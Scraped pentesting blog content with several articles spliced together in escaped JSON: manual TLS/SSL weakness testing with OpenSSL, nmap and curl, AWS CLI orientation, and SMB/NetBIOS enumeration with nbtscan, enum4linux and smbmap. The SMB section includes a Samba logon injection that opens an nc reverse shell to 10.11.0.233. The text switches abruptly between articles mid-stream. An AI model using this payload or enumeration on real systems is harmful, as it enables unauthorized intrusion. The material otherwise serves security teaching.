The reason for that is following Heartbleed; the OpenSSL developers started a significant overhaul, part of which included the elimination of outmoded cryptography. While this is fantastic news for customers from now on; it means we may need to employ two versions of the OpenSSL binary during our engagements to test for a wide range of conditions: one binary for the new features such as TLS v1.3 and one binary for testing old protocols and Cipher configurations such as when testing if a service supports SSL v2.0.\n\nWe can compile out own version of OpenSSL for testing legacy environments. If we start with the OpenSSL 1.0.2g source code, we can make the static binary as follows.\n\n```\n::text\ncd /tmp\nwget https://openssl.org/source/openssl-1.0.2g.tar.gz\ngunzip openssl-1.0.2g.tar.gz\ntar -xvf openssl-1.0.2g.tar\ncd /tmp/openssl-1.0.2g/\n./config  --prefix=/opt/openssl-1.0.2g --openssldir=/opt/openssl-1.0.2g no-shared enable-ssl2 enable-ssl3 enable-weak-ssl-ciphers\nmake depend \nmake all\n```\n\nWe can now test what we have compiled and make sure we are referencing the correct binary for our needs. If we supply the `openssl` binary with no options, we should be presented with an interactive prompt. To confirm the OpenSSL version, type as follows.\n\n```\n/opt/openssl-1.0.2g/bin/openssl                                                                                                                                                          \nOpenSSL> version\nOpenSSL 1.0.2g  1 Mar 2016\nOpenSSL> \n```\n\nWe can compare that to my current binary in Kali Linux. \n\n```\n/usr/bin/openssl \nOpenSSL> version\nOpenSSL 1.1.1l  24 Aug 2021\nOpenSSL> \n```\n\nWe can see that OpenSSL 1.0.2g was released 1 March 2016, and version 1.1.1l was released 24 August 2021. Using the `openssl ciphers` syntax, we see more than just a version number,date and release separating these binaries.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/6b0fdc3f-f387-44ca-9ddc-08cacb6cc151.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Number of Ciphers Supported Between Versions  1.1.1l and 1.0.2g</figcaption></figure>\n\n## Connecting\n\nOpenSSL provides different features and tools for SSL/TLS related operations. We can see a list of these standard commands running the following syntax.\n\n```\nopenssl list-standard-commands\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/b644efe1-38f3-49b1-a45c-eb4b57693e5b.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Cropped Image of OpenSSL Binary Listing Standard Commands</figcaption></figure>\n\n\nAs can be seen, the OpenSSL binary provides many different features and tools for operations related to working with the TLS and SSL protocol. One of these tools, the s_client tool, connects, checks, and lists HTTPS and TLS/SSL-related information. We can assess services using SSL or TLS encryption for our customers using this tool. But first, let us look at its basic usage.\n\nWe will look at one of the most common uses for using the OpenSSL s_client tool, connecting to a remote TLS/SSL website. We provide it with a target and a port number to do this.\n\n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -connect evilsaint.com:443\n```\n\nThis command connected to the evilsaint.com web server on port 443, attempted a full TLS/SSL handshake, and then printed out the following information.\n\n1. The connection status\n2. Chain Verification Status\n3 The certificate chain the server sent \n4 The peer certificate in base64 encoded format\n5 Details regarding the rest of the handshake. \n\n\nAs we move on to expanding on this example it might be prudent to talk about the `-connect` switch.  The connect switch can take any TCP IP address or FQDN. If we looked up the IP address for evilsaint it would show as 192.248.151.138. We could replace the evilsaint.com with the resolved IP address and it would still reach out to attempt a handshake with the webserver. \n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -connect 192.248.151.138:443\n```\n\nWhat if the IP address we were connecting to hosted multiple websites? If we take a look at the following Apache Web Server configuration example (below), we can see there is run server running on the IP Address 172.20.30.40 and there are two domains 'www.example.com' and 'www.example.org'.\n```\n# This is the \"main\" server running on 172.20.30.40\nServerName server.example.com\nDocumentRoot \"/www/mainserver\"\n\n<VirtualHost 172.20.30.50>\n    DocumentRoot \"/www/example1\"\n    ServerName www.example.com\n\n    # Other directives here ...\n</VirtualHost>\n\n<VirtualHost 172.20.30.50>\n    DocumentRoot \"/www/example2\"\n    ServerName www.example.org\n\n    # Other directives here ...\n</VirtualHost>\n```\n\nJust how if you configured virtual hosting with Apache, you would use the domain name to distinguish between multiple websites hosted on the same server. We can do the same with the `-servername` flag. The `-servername` flag lets us set the Server Name Indication (SNI) in the ClientHello message to the given value.  The `-connect` switch is used to establish the TCP connection and can be a FQDN or IP address. The `-servername` is used to specify the domain hostname. If the `-servername` option is empty then openssl sends the same DNS name as what is used for the `-connect` option. If an IP is specified for the `-connect` option and the `-servername` is not provided then the default behaviour since OpenSSL 1.1.1 is to set SNI is to \"localhost\".  \n \n\nHere are two examples demonstrating the same IP address but specifying two different domains. \n```\n::text\nopenssl s_client -servername domain.com -connect X.X.X.X:443\nopenssl s_client -servername domain2.com -connect X.X.X.X:443\n```\n\nLet us move on and discuss a few more switches that can aid our queries. \n\n* -crlf\n* -showcerts\n\nThe addition of the `-crlf` flag. This flag translates line feeds from your terminal into character return & line feeds (CR+LF) that are required by some servers. The `-showcerts` option can be useful when you need to see all certificates returned from the server. \n\nLet us look at an example\n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -crlf -showcerts -connect evilsaint.com:443 -servername www.evilsaint.com\n```\n\n## Automated Testing \n\nThe purpose of this article is to look at ways of manually testing for TLS/SSL weaknesses and so for the most part I want to avoid discussion on popular tools such as testssl, sslyze and sslscan. With that said, after seeing the support for various ciphers and protocols change between versions of the OpenSSL binary versions I am sure there will be those that are interested in how these tools over come this problem and would like to make sure they are testing using a particular version of OpenSSL. \n\n**Testssl**\nTestssl is a bash script that is a direct wrapper around the openssl binary. When you start any scan the output will tell you which version of the binary it used to complete its tests. To change the binary that testssl uses we can enter it as an option when running the command. \n```\n::text\ntestssl.sh openssl=/path/to/openssl <URI>\n```\n\nLet us compare the default system binary to our newly compiled one. \n```\n::text\ntestssl --openssl=/opt/openssl-1.0.2g/bin/openssl https://evilsaint.com\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/2a69cc1d-4400-4ff3-8875-0da4e92e1158.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Support for ~142 Ciphers </figcaption></figure>\n\n```\ntestssl https://evilsaint.com\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"/static/10d48df7-e237-4dcc-8fa6-7ec25875b8c9.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal\">Support for ~81  Ciphers</figcaption></figure>\n\n**SSLScan**\nIf you complete the following on a terminal you will likely find that SSL Scan has been compiled to use the local system binary and there doesn't appear to be an option for sepcifying the openssl binary. \n```\nsslscan --version            \n```\n\nAll however is not lost. SSL Scan 2 has had a major backend code rewrite which means it is no longer reliant on the version of OpenSSL for many of the checks it performs.  Meaning it is possible to support legacy protocols such as SSLv2 and SSLv3 regardless of the version of OpenSSL that is has been compiled against. \n\n**SSLyze**\nSSLyze is an nearly all Python code project but similar to other tools it requires access to low-level OpenSSL functionality. In order to satisfy this the author has created an OpenSSL wrapper written in C code which is called nassl. This was specifically developed for SSLyze. \n\n\n## Manually Testing For Vulnerabilities\n\n### Check For SSL v2 Support\n\nIn addition to the vulnerabilities support for Version 2 of SSL allows it should be noted that in terms of real life practicality, Microsoft has stopped supporting SSL 2.0 in the Windows 10 operating system and IE6 was the last browser that supported SSL version 2 by default. There should be very little reason, if any, to support SSL version 2.0\n\nTo check whether SSLv2 is enabled on the remote host, the following command can be used: \n```\n::text\n/opt/openssl-1.0.2g/bin/openssl s_client -ssl2 -connect evilsaint.com:443\n```\n\nIf SSLv2 is supported, the handshake will complete and server certificate information will be returned. \n\n\nAlternatively to using the OpenSSL command line tool that you can try and use Curl. \n\n```bash\ncurl --sslv2 -I evilsaint.com:443\n```\n\nCheck the output, you want to see something similar to the following:\n```\n* SSL peer handshake failed\n```\n\nAs opposed to \n```\n* SSL 2.0 connection using SSL_NULL_WITH_NULL_NULL\n```\n\n### Check For SSL v3 Support\n\nTo test whether a system supports SSLv3, the following OpenSSL command can be used:\n```\n::text\nopenssl s_client --sslv3 -connect evilsaint.com:443\n```\n\nIf SSLv2 is supported, the handshake will complete and server certificate information will be returned. \n\n\nAlternatively to using the OpenSSL command line tool that you can try and use Curl. \n\n```\n::text\ncurl --sslv3 -I evilsaint.com:443\n```\n\nCheck the output, you want to see something similar to the following:\n```\n* SSL peer handshake failed\n```\n\nAs opposed to \n```\n* SSL 3.0 connection using SSL_NULL_WITH_NULL_NULL\n```\n\n\n### Cipher Suites\n\n\n```\nopenssl s_client -cipher\n```\n\n```\n::text\nnmap --script ssl-enum-ciphers -p 443 example.com\n```\n\n### Server Certificate\n\n```\n::text\nopenssl s_client -connect example.com:443 | openssl x509 -noout -text\n```\n\n\n### Secure Renegotiation \n\n\nThe following demonstrates how to verify if a system supports secure renegotiation.\n\n```\n::text\nopenssl s_client -connect example.com:443\n```\n\n### Client Initiated Renegotiation\n\nThe following demonstrates how to check if client initiated renegotiation is supported.\n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nOnce the connection is established, the server will wait for us to type the next command. We can write the following two lines in order to initiate a renegotiation by specifying R in the second line, followed by enter or return.\n\n```\n::text\nopenssl s_client -connect host:port\nHEAD / HTTP/1.0\nR\n<Enter or Return key>\n```\n\n### TLS Compression\n\nTo test whether a server supports TLS compression, and is vulnerable to CRIME, the following method can be used: \n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nFor servers that have TLS compression disabled, the response will be similar to the following. The \"Compression: NONE\" shows that this server rejects usage of TLS-level compression.\n\n### HTTP Compression\n\nTo test whether a server supports deflate or compression, the following steps can be performed: \n```\n::text\nopenssl s_client -connect example.com:443\n```\n\nSubmitting the following will allow us to see if HTTP compression is supported by the server.\n```\nGET / HTTP/1.1\nHost: example.com\nAccept-Encoding: compress, gzip\n```\n\n### Change Cipher Spec Injection\n\nA weakness exists in some versions of OpenSSL which can be exploited by intermediary third parties in order to retrieve sensitive information from encrypted communication.\n\nAffected Versions:\n\n•    OpenSSL 1.0.1 through 1.0.1g\n•    OpenSSL 1.0.0 through 1.0.0l\n•    all versions before OpenSSL 0.9.8y\n\nTesting requires using publicly available tools, such as the the ‘ssl-ccs-injection’ nmap script by Claudiu Perta, which can be used to test for this vulnerability. This script can be downloaded from https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html.\n\n```\n::text\nnmap -p 443 --script ssl-ccs-injection example.com\n```\n\n### Heartbeat - TLS Extension\n\n\n```\n::text\nopenssl s_client –tlsextdebug\n```"},"prev":{"fields":{"slug":"/speaking-aws"},"excerpt":null,"frontmatter":{"date":"9th February 2022 ","title":"Speaking AWS","description":"aws, cloud, s3-buckets, scoutsuite","tags":"aws, cloud, s3-buckets, scoutsuite","posttype":"article"},"body":"# Introduction To Terminology\n\n\n| AWS Term                             | Pentester Analogy                                                                           |\n|--------------------------------------|---------------------------------------------------------------------------------------------|\n| Region                               | Geographical location containing availability zones                                         |\n| AZ (Availability Zone)               | Location mapped to a physical data centre in a region                                       |\n| VPC (Virtual Private Cloud)          | The network infrastructure (can include public and private subnets)                         |\n| EC2 (Elastic Compute Cloud) instance | Virtual Machine                                                                             |\n| Security Groups                      | Firewall rules applied to the single instance                                               |\n| Network ACL                          | Firewall rules applied to a subnet                                                          |\n| ELB (Elastic Load Balancer)          | Network load balancer to optimise traffic across instances.                                 |\n| IAM (Identity & Access Management)   | A service to manage users, groups, roles and security policies                              |\n| S3 (Simple Storage Service Bucket)   | A container for any type of data                                                            |\n| CloudTrail & CloudWatch              | Logging, Monitoring and Auditing of Events.                                                 |\n| RDS (Relational Database Service)    | A service allowing the creation of relational databases (MS SQL, Oracle, Aurora/MySQL, etc) |\n| KMS (Key Management Service)         | KeyChain, Password Vault, etc                                                               |\n\nhttps://cloudonaut.io/aws-security-primer/\n\n\n# Orientation \n\nConfigure the CLI for first usage\n```\naws configure --profile <profile name>\n```\n\n> It should be noted that the credentials will be stored in your home directory: `~/.aws/credentials`\n\nList AWS regions & VPC(s) available\n```\naws ec2 describe-regions\naws ec2 describe-vpcs\n```\n\nGet AWS console alias\n```\naws iam list-account-aliases\n```\n\nGet username associated to an AWS API KEY\n```\naws iam get-user\n```\n\nIf you have no access to IAM then the following command will work.\n```\naws sts get-caller-identity \n```\n\n## Getting Your Whereabouts\n\n\nFind Your ID\n```\naws sts get-caller-identity\n```\n\nLog in to the console\n```\nhttps://Your_Account_ID.signin.aws.amazon.com/console/\n```\n\n## Setting Up Temporary Credentials\n\nTo use the credentials returned by the assume-role \n\nIn Linux set some bash variables with export\n```\n$ export AWS_ACCESS_KEY_ID=XXXX\n$ export AWS_SECRET_ACCESS_KEY=XXXX\n$ export AWS_SESSION_TOKEN=XXXX\n```\n\nIn Windows do the equivalent with SET\n```\nC:\\> SET AWS_ACCESS_KEY_ID=XXXX\nC:\\> SET AWS_SECRET_ACCESS_KEY=XXXX\nC:\\> SET AWS_SESSION_TOKEN=XXXX\n```\n\n> Note that this will set the credentials for your default AWS account in your machine.

SMB ran on top of the NetBIOS protocol in early versions of Windows, but eventually moved to its own dedicated TCP port. While NetBIOS is the older protocol, understanding both is nearly essential for understanding Windows network communications. The SMB protocol enables networked computers' applications and services to communicate via Inter Process Communication (IPC) and to share files.","tags":"netbios, smb","posttype":"article"},"body":"##What is NetBIOS?\n\nNetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model, allowing applications on separate computers to communicate over a local area network. \n  \nNetBIOS is an API and not a networking protocol.  \n\n##How does NetBIOS operate?\n  \nOlder operating systems ran NetBIOS using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols.  \n  \nIn modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name.  \n\n##What are the benefits of NetBIOS?\n  \nNetBIOS provides three distinct services:  \n  \n* Name service (NetBIOS-NS) for name registration and resolution.  \n* Datagram distribution service (NetBIOS-DGM) for connectionless communication.  \n* Session service (NetBIOS-SSN) for connection-oriented communication.  \n\n##What is SMB?\n  \nN.B. SMB, an upper layer, is a service that runs on top of the Session Service and the Datagram service, and is not to be confused as a necessary and integral part of NetBIOS itself. It can now run atop TCP with a small adaptation layer that adds a packet length to each SMB message; this is necessary because TCP only provides a byte-stream service with no notion of packet boundaries  \n\n##How does SMB operate?\n  \nSMB can run on top of the Session (and lower) network layers in several ways:  \n  \n* Directly over TCP, port 445  \n* Via the NetBIOS API on UDP ports 137, 138 &amp; TCP ports 137, 139 (NetBIOS over TCP/IP);  \n\n##What are the benefits of SMB?\n\nThe SMB \"Inter-Process Communication\" (IPC) system provides named pipes and was one of the first inter-process mechanisms widely available to programmers, allowing services to inherit the authentication performed when a client first connected to an SMB server. \n  \nSince Windows 2000, SMB has been running with a thin layer on top of TCP, similar to the Session Message packet of NBT's Session Service, using TCP port 445 rather than TCP port 139; this is known as \"direct host SMB.\" \n  \n## SMB Versions\n\n### Version Summary:  \n\n* SMB1 – Windows 2000, XP and Windows 2003.  \n* SMB2 – Windows Vista SP1 and Windows 2008  \n* SMB2.1 – Windows 7 and Windows 2008 R2  \n* SMB3 – Windows 8 and Windows 2012.  \n\n### SMB 2.0\n\nMicrosoft introduced a newer version of the protocol (SMB 2.0 or SMB2) with Windows Vista in 2006  \n\n### SMB 2.1\n\nWith Windows 7 and Server 2008 R2, a new opportunistic locking mechanism was introduced, resulting in minor performance improvements. \n  \n### SMB 3.0 (previously SMB 2.2)\n\nWas introduced with Windows 8 and Windows Server 2012.  \n  \n### SMB 3.0.2 \n\nIntroduced with Windows 8.1 and Windows Server 2012 R2. In 3.0.2, the earlier SMB version 1 can be optionally disabled to increase security.\n   \n### SMB 3.1.1 \n\nDebuted alongside Windows 10 and Windows Server 2016. This version adds AES 128 GCM encryption to the AES 128 CCM encryption introduced in SMB3, as well as a pre-authentication integrity check using the SHA-512 hash. SMB 3.1.1 also requires secure negotiation when connecting to clients that use SMB 2.x or higher. \n\n## Security Flaws Windows  \n\nThere have been numerous security flaws in Microsoft's implementation of the protocol or the components on which it directly relies over the years.\nOther vendors' security flaws stem primarily from a lack of support for newer authentication protocols such as NTLMv2 and Kerberos in favour of NTLMv1, LanMan, or plaintext passwords. Real-time attack tracking reveals that SMB is a primary attack vector for intrusion attempts, such as the Sony Pictures attack in 2014.  \n  \nNetBIOS is effectively becoming a legacy protocol in client-server networks based on post-MS Windows 2000 / NT. NetBIOS was also designed for non-routable local area networks. NetBIOS effectively provides backwards compatibility for network devices that predate DNS compatibility in most post-2000 networks running Windows 2000 or later. NetBIOS's primary role in Client-Server networks (as well as those with networked peripheral hardware that predates DNS compatibility) is to provide name resolution to computers and networked peripherals. Furthermore, it enables the access and sharing of networked hardware, as well as the mapping and browsing of network folders, shares, and shared printers, faxes, and so on. Its primary function is to provide name resolution to a computer and shared folders via a session-layer protocol transported over TCP/IP. As a result, Windows 2000-based Client-Server networks - and later - do not require this insecure method of name resolution, addressing, or navigating network shares. \n  \n## Security Flaws in Samba:  \n\nSome versions of Samba 3.6.3 and lower have serious security flaws that can allow anonymous users to gain root access to a system via an anonymous connection by exploiting an error in Samba's remote procedure call.\n\nBadlock, a critical security flaw in Windows and Samba, was publicly disclosed on April 12, 2016. CVE-2016-2118 mentions Badlock for Samba (SAMR and LSA person-in-the-middle attacks are possible). \n  \n  \n## Null Sessions\n  \n* In Windows 2000 and Windows NT, null sessions are enabled by default.\n* They are also enabled by default in Windows XP and Windows 2003 Server, but they do not support user account enumeration. \n  \n## SMB Programs \n\nsmbcacls - Set or get ACLs on an NT file or directory names  \n```  \n/usr/bin/smbcacls  \n```\n\nsmbclient - ftp-like client to access SMB/CIFS resources on servers    \n```\n/usr/bin/smbclient\n```\n  \nsmbcontrol - send messages to smbd, nmbd or winbindd processes  \n```  \n/usr/bin/smbcontrol  \n```  \n\nsmbcquotas - Set or get QUOTAs of NTFS 5 shares  \n```  \n/usr/bin/smbcquotas  \n```  \n\nsmbget - wget-like utility for download files over SMB  \n```  \n/usr/bin/smbget  \n/usr/bin/smbmap  \n```  \n\nsmbpasswd - The Samba encrypted password file  \nsmbpasswd - change a user's SMB password  \n```\n/usr/bin/smbpasswd  \n```\n  \nsmbspool - send a print file to an SMB printer  \n```  \n/usr/bin/smbspool  \n```  \n\nsmbstatus - report on current Samba connections  \n```  \n/usr/bin/smbstatus  \n```  \n\nsmbtar - smbtar - shell script for backing up SMB/CIFS shares directly to UNIX tape drives  \n```  \n/usr/bin/smbtar  \n```  \n\nsmbtree - A text based smb network browser  \n```  \n/usr/bin/smbtree  \n```  \n\nOthers: \n``` \n/usr/bin/dceoversmb   \n/usr/bin/pth-smbclient  \n/usr/bin/pth-smbget  \n```\n\n## Smbtree\n\nShow smbtree version  \n```\nsmbtree --version  \n```\n\nShow all workgroups  \n```\nsmbtree  \n```\n\n## Nbtscan vs Nbtstat\n\nThe difference between nbtstat and nbtscan in Windows is that nbtscan can work with multiple IP addresses.\n\nTo determine the meaning of each service in the NetBIOS report, visit Microsoft Knowledge Based on NetBIOS Suffixes (16th Character of the NetBIOS Name) at: \n\n* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847b\n\n### Nbtscan\n\nnbtscan is an abbreviation for 'NetBIOS over TCP scanner. \n\nThis is a command-line tool that searches for open NetBIOS nameservers on a local or remote TCP/IP network, which is the first step in discovering open shares. It is based on the functionality of the standard Windows tool nbtstat, but instead of just one address, it operates on a range of addresses. \n\n#### Scanning the network\n\nThis scan will return the IP address of the computer(s), the NetBIOS name, the current logged in user, and the mac address of all NetBIOS on the local subnet. \n\n```\nnbtscan 10.11.1.1-254\nnbtscan 110.11.1.0/24\n```\n\n#### Examining one host\n\nOnce we have decided on a host, we can enter just one host for more information. \n```\nnbtscan -hv 10.11.1.5\n```\n\nThe `-h` makes the output services human-readable and the `-v` gives a verbose output.\n\nIf instead you would like to see a dump of the packets you can use the `-d` option but it **can not** be used with the `-v` or `-d`.\n```\nnbtscan -d 10.11.1.5\n```\n\nSometimes you may want to grep the results and so the -s flag can come in handy to put a separator between the fields.\n\nPipe as a separator:\n```\nnbtscan -vh -s \"|\" 10.11.1.0/24\n```\n\nColon as a separator:\n```\nnbtscan -vh -s : 192.168.1.0/24\n```\n\nFinally, we may want to enter the IP addresses of hosts to scan, which we can do as follows. \n```\nnbtscan -f iplist.txt\n```\n\n#### Additional Flags\n\nAs per the man page, the following three flags sometimes can be useful.\n\nBandwidth output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that outgoing queries do not get dropped.\n```\nnbtscan -b 1000 10.11.1.5\n```\n\nUse local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix.\n```\nnbtscan -r 10.11.1.0/24\n```\n\nSuppress banners, headers and error messages.\n```\nnbtscan -q 10.11.1.0/24\n```\n\n## Nmblookup\n\nUse this on a single IP address for greater detail following the nbtscan.\n\nDo a node status on <name> as an IP address:\n```\nnmblookup -A <ip address>\n```\n\nTo find the IP address of a computer given its computer name, we can use:\n```\nnmblookup <computer name>\n```\n\nTo find the group the computer belongs to and its MAC address:\n```\nnmblookup -S <computer name>\n```\n\nFor example, lines containing '<00>' in the output of 'nmblookup -S <computer name>' can be interpreted as follows. The one that is not followed by group is the computer name, and the one that is is the workgroup name to which this computer belongs. \n\nTo find IP addresses of all computers in a workgroup, we can use:\n```\nnmblookup <workgroup name>\n```\n\nIf we want computer names along with IP addresses, then we can use:\n```\nnmblookup -S <workgroup name>\n```\n\n### Workgroup Flags\n\n* workgroup `<00>` group - This name is a remnant of the original LAN Manager browse service.\n* workgroup `<1D>` unique - This name identifies the Local Master Browser (LMB, sometimes called simply \"Master Browser\") for a subnet.\n* workgroup `<1E>` -  group A node that is capable of acting as a \"Browser\" registers this group name to listen for election announcements.\n* nt_domain `<1B>` unique Name registered by the Domain Master Browser. Must be registered with the NBNS in order to be of any real use.\n* nt_domain `<1C>` Internet group Registered by all Domain Controllers in the given NT Domain.\n\n## Nmap\n\nNmap scripts for SMB are located at:\n```\nls -l /usr/share/nmap/scripts/smb*\nls -lsa /usr/share/nmap/scripts | grep \"smb\"\nls /usr/share/nmap/scripts | grep \"smb\" | sed \"s/.nse/,/\" | tr -d \"\\n\\r\"\n```\n\nThe below scripts are available to us.\n```\nsmb-brute,smb-enum-domains,smb-enum-groups, smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,\nsmb-flood,smb-ls,smb-mbenum, smb-os-discovery,smb-print-text,smb-psexec, smb-security-mode,smb-server-stats\nsmb-system-info,smbv2-enabled,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029\nsmb-vuln-ms08-067, smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos\n```\n\nWe start off by seeing which SMB ports are open (the `--open` switch is used in order to show only open ports).\n```\nnmap -p 139,445 192.168.1.0/24 --open\n```\n\nWe can also do basic SMB Vulnerability Checking.\n```\nnmap -p T:137,139,445,U:137,139,445 --script=vulns --script-args=unsafe=1 192.168.1.111\n```\n\n### Discover network shares with Nmap\n\nAfter a list of shares is found, the script attempts to connect to each of them anonymously, which divides them into \"anonymous\", for shares that the NULL user can connect to, or \"restricted\", for shares that require a user account.\n\n* https://nmap.org/nsedoc/scripts/smb-enum-shares.html\n\nUse the smb-os-discovery.nse script to discover NetBIOS computer name. The reason for this is that a computer named maria-pc, most likely to have a user named maria, so you can use it during brute forcing phase.\n```\nnmap --open -sS -sV --script smb-enum-shares.nse,smb-os-discovery.nse -p445,139 10.11.1.1/24\n```\n\n## Enum4linux\n\nEnum4linux is a wrapper for smbclient, rpcclient, net and nmblookup.\n\n* http://labs.portcullis.co.uk/tools/enum4linux/\n\nVerbose mode, shows the underlying commands being executed by enum4linux and is a great way to learn what the tool is running behind the scenes.\n```\nenum4linux -v <target-ip>\n```\n\nDo Everything, runs all options apart from dictionary based share name guessing.

To do this, our first step is to download the cifs-utilities.\n```\napt-get install cifs-utils\n```\n\nAfter that, we can create a directory in which we want to mount our share. For example, we could install it in the /tmp/ or /mnt/ drives. \n```\nmkdir /tmp/myshare\n```\n\nWe can then mount this directly using the following two options. N.B. The difference is that mount.cifs is a wrapper for mount.\n```\nmount -t cifs //10.11.1.31/wwwroot /mnt/myshare\nmount.cifs //10.11.1.31/wwwroot /mnt/myshare\n```\n\nPassing in options\n```\nmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw\n```\n\nTo unmount a particular share, you have two options. You can either \n\na) navigate to the share on your local system and run\n```\numount -A\n```\n\nOr\n\nb) you can run the same command with the path following from any directory\n```\numount -A /tmp/\n```\n\nTo get a shell back from an SMB share.\n```\nlogon \"/=`nc 10.11.0.233 443 -e /bin/bash`\"\n```\n\n## smb4k\n\nTo install\n```\napt-get install smb4k -y\n```\n\nTo Run\n```\nsmb4k\n```\n\n## Smbmap\n\nList all shares\n```\nsmbmap -H 10.11.1.2\n```\nRecursively view all files inside a share named share\n```\nsmbmap -H 10.11.1.2 -r \"share\"\n```\n  \n## Pass The Hash  \n  \nMore To Come :-)"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}
